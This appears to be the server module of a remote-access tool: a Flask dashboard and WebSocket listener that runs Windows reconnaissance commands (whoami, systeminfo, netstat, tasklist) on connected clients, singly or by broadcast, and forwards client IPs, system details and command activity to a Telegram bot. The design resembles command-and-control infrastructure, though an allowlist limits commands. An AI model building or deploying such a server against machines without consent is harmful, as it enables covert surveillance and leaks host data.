"""
Main Server Module - Using WebSockets for Render compatibility
"""

import asyncio
import websockets
import json
import os
import subprocess
import requests
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
import threading
import sys
import signal

# Add current directory to path
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

from auth import authenticate
from config import DEBUG_MODE, ALLOWED_COMMANDS

# Flask app for web interface
app = Flask(__name__)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')

# Store connected clients
connected_clients = {}
client_lock = threading.Lock()

# HTML Dashboard
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Remote Monitoring Dashboard</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        h1 {
            color: #667eea;
            margin-top: 0;
        }
        .status {
            display: inline-block;
            padding: 5px 10px;
            border-radius: 5px;
            font-weight: bold;
        }
        .status.online {
            background: #4caf50;
            color: white;
        }
        .clients-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        .clients-table th,
        .clients-table td {
            border: 1px solid #ddd;
            padding: 12px;
            text-align: left;
        }
        .clients-table th {
            background: #667eea;
            color: white;
        }
        .command-form {
            margin-top: 20px;
            padding: 20px;
            background: #f5f5f5;
            border-radius: 5px;
        }
        select, input, button {
            padding: 10px;
            margin: 5px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background: #5a67d8;
        }
        .output {
            margin-top: 20px;
            padding: 15px;
            background: #1e1e1e;
            color: #d4d4d4;
            border-radius: 5px;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
        }
        .refresh-btn {
            float: right;
            margin-bottom: 10px;
        }
        .info {
            background: #e3f2fd;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .telegram-status {
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            display: inline-block;
        }
        .telegram-enabled {
            background: #4caf50;
            color: white;
        }
        .telegram-disabled {
            background: #ff9800;
            color: white;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 Remote Monitoring Dashboard</h1>
        
        <div class="info">
            <strong>Server Status:</strong> 
            <span class="status online">Online</span>
            <span style="margin-left: 20px;">
                <strong>Telegram Logging:</strong>
                <span class="telegram-status {{ 'telegram-enabled' if telegram_enabled else 'telegram-disabled' }}">
                    {{ '✅ Enabled' if telegram_enabled else '⚠️ Disabled' }}
                </span>
            </span>
            <button onclick="refreshData()" class="refresh-btn">🔄 Refresh</button>
        </div>
        
        <h2>Connected Clients (<span id="clientCount">0</span>)</h2>
        <table class="clients-table">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>IP Address</th>
                    <th>Username</th>
                    <th>Connected Since</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="clientsList">
                <tr>
                    <td colspan="5" style="text-align: center;">Loading clients...</td>
                </tr>
            </tbody>
        </table>
        
        <div class="command-form">
            <h3>Execute Command</h3>
            <select id="clientSelect">
                <option value="all">All Clients</option>
            </select>
            <select id="commandSelect">
                <option value="whoami">whoami - Get username</option>
                <option value="hostname">hostname - Get computer name</option>
                <option value="ipconfig">ipconfig - Network info</option>
                <option value="systeminfo">systeminfo - System details</option>
                <option value="netstat">netstat - Network connections</option>
                <option value="tasklist">tasklist - Running processes</option>
            </select>
            <button onclick="executeCommand()">▶ Execute</button>
            
            <div class="output" id="output">
                Command output will appear here...
            </div>
        </div>
    </div>
    
    <script>
        function refreshData() {
            fetch('/clients')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('clientCount').innerText = data.length;
                    const tbody = document.getElementById('clientsList');
                    const select = document.getElementById('clientSelect');
                    
                    if (data.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="5" style="text-align: center;">No clients connected</td></tr>';
                        select.innerHTML = '<option value="all">All Clients (0)</option>';
                        return;
                    }
                    
                    tbody.innerHTML = '';
                    select.innerHTML = '<option value="all">All Clients (' + data.length + ')</option>';
                    
                    data.forEach((client, index) => {
                        const row = tbody.insertRow();
                        row.insertCell(0).innerText = index;
                        row.insertCell(1).innerText = client.ip;
                        row.insertCell(2).innerText = client.username;
                        row.insertCell(3).innerText = new Date(client.connected_since).toLocaleString();
                        const actionCell = row.insertCell(4);
                        const btn = document.createElement('button');
                        btn.innerText = 'Execute';
                        btn.onclick = () => executeOnClient(index);
                        actionCell.appendChild(btn);
                        
                        const option = document.createElement('option');
                        option.value = index;
                        option.innerText = 'Client ' + index + ': ' + client.username + ' (' + client.ip + ')';
                        select.appendChild(option);
                    });
                })
                .catch(error => {
                    console.error('Error:', error);
                    document.getElementById('clientsList').innerHTML = '<tr><td colspan="5" style="text-align: center;">Error loading clients</td></tr>';
                });
        }
        
        function executeOnClient(clientId) {
            const command = document.getElementById('commandSelect').value;
            execute(clientId, command);
        }
        
        function executeCommand() {
            const clientId = document.getElementById('clientSelect').value;
            const command = document.getElementById('commandSelect').value;
            execute(clientId, command);
        }
        
        function execute(clientId, command) {
            const outputDiv = document.getElementById('output');
            outputDiv.innerHTML = 'Executing command on ' + (clientId === 'all' ? 'all clients' : 'client ' + clientId) + '...';
            
            const url = clientId === 'all' ? '/broadcast' : '/execute/' + clientId;
            const payload = { command: command };
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    outputDiv.innerHTML = 'Error: ' + data.error;
                } else if (clientId === 'all') {
                    let output = '=== BROADCAST RESULTS ===\\n\\n';
                    data.results.forEach(result => {
                        output += `Client ${result.client_id} (${result.username}):\\n`;
                        output += `${result.output}\\n`;
                        output += '-' .repeat(50) + '\\n';
                    });
                    outputDiv.innerHTML = output;
                } else {
                    outputDiv.innerHTML = '=== COMMAND OUTPUT ===\\n\\n' + data.output;
                }
            })
            .catch(error => {
                outputDiv.innerHTML = 'Error: ' + error;
            });
        }
        
        // Refresh every 10 seconds
        setInterval(refreshData, 10000);
        refreshData();
    </script>
</body>
</html>
"""

def send_telegram_message(message):
    """Send message to Telegram"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message[:4096],
            'parse_mode': 'HTML'
        }
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"[!] Telegram error: {e}")
        return False

def hash_password(password):
    import hashlib
    return hashlib.sha256(password.encode()).hexdigest()

async def websocket_handler(websocket, path):
    """Handle WebSocket client connections"""
    try:
        # Receive credentials
        data = await websocket.recv()
        auth_data = json.loads(data)
        username = auth_data.get('username', '')
        password = auth_data.get('password', '')
        
        print(f"\n[+] WebSocket connection from {websocket.remote_address}")
        print(f"[+] Username: '{username}'")
        
        # Authenticate
        if authenticate(username, password):
            # Receive system info
            system_info = await websocket.recv()
            
            # Log to Telegram
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            send_telegram_message(
                f"🟢 <b>New Connection</b>\n"
                f"👤 User: <code>{username}</code>\n"
                f"🌐 IP: {websocket.remote_address[0]}\n"
                f"💻 System Info:\n<code>{system_info[:300]}...</code>"
            )
            
            # Store client
            client_id = f"{username}_{timestamp}"
            with client_lock:
                connected_clients[client_id] = {
                    'websocket': websocket,
                    'username': username,
                    'ip': websocket.remote_address[0],
                    'connected_since': datetime.now().isoformat(),
                    'system_info': system_info[:200]
                }
            
            # Send success message
            await websocket.send(json.dumps({'status': 'AUTH_SUCCESS'}))
            
            print(f"[+] Client {username} connected. Total clients: {len(connected_clients)}")
            
            # Keep connection alive and handle commands
            while True:
                try:
                    # Wait for command response (ping/pong)
                    await asyncio.sleep(30)
                    await websocket.send(json.dumps({'type': 'ping'}))
                    response = await asyncio.wait_for(websocket.recv(), timeout=10)
                    if json.loads(response).get('type') != 'pong':
                        break
                except:
                    break
        else:
            await websocket.send(json.dumps({'status': 'AUTH_FAILED'}))
            send_telegram_message(
                f"🔴 <b>Failed Login Attempt</b>\n"
                f"👤 Username: <code>{username}</code>\n"
                f"🌐 IP: {websocket.remote_address[0]}"
            )
    
    except Exception as e:
        print(f"[ERROR] {e}")
    finally:
        # Remove client on disconnect
        with client_lock:
            to_remove = [cid for cid, client in connected_clients.items() 
                        if client.get('websocket') == websocket]
            for cid in to_remove:
                del connected_clients[cid]
        print(f"[-] Client disconnected. Total clients: {len(connected_clients)}")

# Flask routes
@app.route('/')
def index():
    return render_template_string(
        DASHBOARD_HTML,
        telegram_enabled=bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
    )

@app.route('/clients')
def get_clients():
    """Get list of connected clients"""
    with client_lock:
        clients_info = []
        for cid, client in connected_clients.items():
            clients_info.append({
                'id': cid,
                'ip': client['ip'],
                'username': client['username'],
                'connected_since': client['connected_since']
            })
    return jsonify(clients_info)

@app.route('/execute/<client_id>', methods=['POST'])
def execute_command(client_id):
    """Execute command on specific client"""
    try:
        command = request.json.get('command', '').lower()
        
        if command not in ALLOWED_COMMANDS:
            return jsonify({'error': f'Command "{command}" not allowed'}), 403
        
        with client_lock:
            if client_id not in connected_clients:
                return jsonify({'error': 'Client not found'}), 404
            
            client = connected_clients[client_id]
            websocket = client['websocket']
            
            # Send command via WebSocket
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            async def send_command():
                await websocket.send(json.dumps({'type': 'command', 'command': command}))
                response = await asyncio.wait_for(websocket.recv(), timeout=30)
                return json.loads(response).get('output', 'No output')
            
            result = loop.run_until_complete(send_command())
            loop.close()
            
            # Log to Telegram
            send_telegram_message(
                f"💻 <b>Command Executed</b>\n"
                f"👤 User: {client['username']}\n"
                f"🌐 IP: {client['ip']}\n"
                f"🔧 Command: <code>{command}</code>\n"
                f"📤 Output Length: {len(result)} chars"
            )
            
            return jsonify({'output': result})
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/broadcast', methods=['POST'])
def broadcast_command():
    """Send command to all connected clients"""
    try:
        command = request.json.get('command', '').lower()
        
        if command not in ALLOWED_COMMANDS:
            return jsonify({'error': f'Command "{command}" not allowed'}), 403
        
        results = []
        with client_lock:
            for cid, client in list(connected_clients.items()):
                try:
                    websocket = client['websocket']
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    
                    async def send_command():
                        await websocket.send(json.dumps({'type': 'command', 'command': command}))
                        response = await asyncio.wait_for(websocket.recv(), timeout=30)
                        return json.loads(response).get('output', 'No output')
                    
                    result = loop.run_until_complete(send_command())
                    loop.close()
                    
                    results.append({
                        'client_id': cid,
                        'username': client['username'],
                        'ip': client['ip'],
                        'output': result
                    })
                except Exception as e:
                    results.append({
                        'client_id': cid,
                        'username': client['username'],
                        'ip': client['ip'],
                        'output': f'Failed: {str(e)}'
                    })
        
        # Log to Telegram
        send_telegram_message(
            f"📢 <b>Broadcast Command</b>\n"
            f"🔧 Command: <code>{command}</code>\n"
            f"👥 Affected clients: {len(results)}"
        )
        
        return jsonify({'results': results})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/stats')
def get_stats():
    return jsonify({
        'connected_clients': len(connected_clients),
        'uptime': datetime.now().isoformat(),
        'telegram_enabled': bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
    })

def signal_handler(sig, frame):
    print("\n[+] Shutting down server...")
    send_telegram_message("🛑 Server is shutting down")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Start WebSocket server in separate thread
    import asyncio
    import threading
    
    async def start_websocket_server():
        async with websockets.serve(websocket_handler, "0.0.0.0", 8765):
            print(f"\n[✓] WebSocket server listening on 0.0.0.0:8765")
            await asyncio.Future()  # Run forever
    
    def run_websocket():
        asyncio.run(start_websocket_server())
    
    ws_thread = threading.Thread(target=run_websocket, daemon=True)
    ws_thread.start()
    
    # Print server info
    print("\n" + "="*50)
    print("  REMOTE MONITORING SERVER")
    print("="*50)
    print(f"\n[+] Web Dashboard: http://localhost:{os.environ.get('PORT', 5000)}")
    print(f"[+] WebSocket Port: 8765")
    print(f"[+] Telegram Logging: {'Enabled' if TELEGRAM_BOT_TOKEN else 'Disabled'}")
    print("="*50)
    
    # Send startup message
    send_telegram_message("🚀 Server started successfully with WebSockets!")
    
    # Start Flask web server
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)